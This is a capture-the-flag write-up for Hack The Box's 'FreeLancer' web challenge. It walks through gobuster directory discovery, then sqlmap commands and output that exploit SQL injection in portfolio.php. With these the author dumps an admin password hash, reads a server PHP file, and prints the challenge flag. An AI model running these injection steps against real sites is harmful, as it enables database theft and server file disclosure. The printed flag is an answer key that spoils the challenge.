# FreeLancer

Connecting to http://docker.hackthebox.eu:32280/ shows a blog that seems not to have been configured. There is a contact form but no field seems to be injectable.

There is a `robots.txt` file but it seems empty. Running gobuster reveals 2 interesting locations: `/administrat` and `/mail`. The analysis of the source code of the main page reveals that the `/mail` folder contains a `contact_me.php` file that needs to be configured.

On the other hand, the `/administrat` location is an authentication form, but we don't have clues about credentials.

Continuing the exploration of the source code of the main page reveals that images are loaded via a `portfolio.php` file that takes an `id` parameter (e.g. http://docker.hackthebox.eu:32280/portfolio.php?id=1). Let's use `sqlmap` to check if it could be injectable:

~~~
kali@kali:/data/src/sqlmap$ sqlmap -u "http://docker.hackthebox.eu:32280/portfolio.php?id=1" --current-db

[REDACTED]

---
[11:55:27] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:55:27] [INFO] fetching current database
current database: 'freelancer'
[11:55:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/docker.hackthebox.eu'

[*] ending @ 11:55:27 /2020-08-23/
~~~

The current database is "freelancer". Let's list the tables.

~~~
kali@kali:/data/src/sqlmap$ sqlmap -u "http://docker.hackthebox.eu:32280/portfolio.php?id=1" -D freelancer --tables

[REDACTED]

Database: freelancer
[2 tables]
+-----------+
| portfolio |
| safeadmin |
+-----------+
~~~

And now, let's dump the content of the `safeadmin` table:

~~~
kali@kali:/data/src/sqlmap$ sqlmap -u "http://docker.hackthebox.eu:32280/portfolio.php?id=1" -D freelancer -T safeadmin --dump

[REDACTED]

Database: freelancer
Table: safeadmin
[1 entry]
+----+--------------------------------------------------------------+----------+---------------------+
| id | password                                                     | username | created_at          |
+----+--------------------------------------------------------------+----------+---------------------+
| 1  | $2y$10$s2ZCi/tHICnA97uf4MfbZuhmOZQXdCnrM9VM9LBMHPp68vAXNRf4K | safeadm  | 2019-07-16 20:25:45 |
+----+--------------------------------------------------------------+----------+---------------------+
~~~

Unfortunately, I was not successful in cracking the password hash.

Recursively bruteforcing the discovery of files in the `/administrat` directory with gobuster reveals the presence of a `panel.php` file.

~~~
kali@kali:/data/src/sqlmap$ gobuster dir -u http://docker.hackthebox.eu:32280/administrat/ -x php -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:32280/administrat/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/08/23 11:59:51 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/include (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/logout.php (Status: 302)
/panel.php (Status: 302)
===============================================================
2020/08/23 12:00:35 Finished
===============================================================
~~~

Still using the previous SQL injection, we may use sqlmap to dump the content of the file:

~~~
kali@kali:/data/src/sqlmap$ sqlmap -u "http://docker.hackthebox.eu:32280/portfolio.php?id=1" --file-read=/var/www/html/administrat/panel.php

[REDACTED]

[*] /home/kali/.local/share/sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php (same file)
~~~

Let's check the file:

~~~
kali@kali:/data/src/sqlmap$ cat ~/.local/share/sqlmap/output/docker.hackthebox.eu/files/_var_www_html_administrat_panel.php 
<?php
// Initialize the session
session_start();
 
// Check if the user is logged in, if not then redirect him to login page
if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
    header("location: index.php");
    exit;
}
?>
 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css">
  <link rel="icon" href="../favicon.ico" type="image/x-icon">
    <style type="text/css">
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div class="page-header">
        <h1>Hi, <b><?php echo htmlspecialchars($_SESSION["username"]); ?></b>. Welcome to our site.</h1><b><a href="logout.php">Logout</a></b>
<br><br><br>
        <h1>HTB{s4ff_3_1_w33b_fr4__l33nc_3}</h1>
    </div>
</body>
</html>
~~~

Flag: `HTB{s4ff_3_1_w33b_fr4__l33nc_3}`
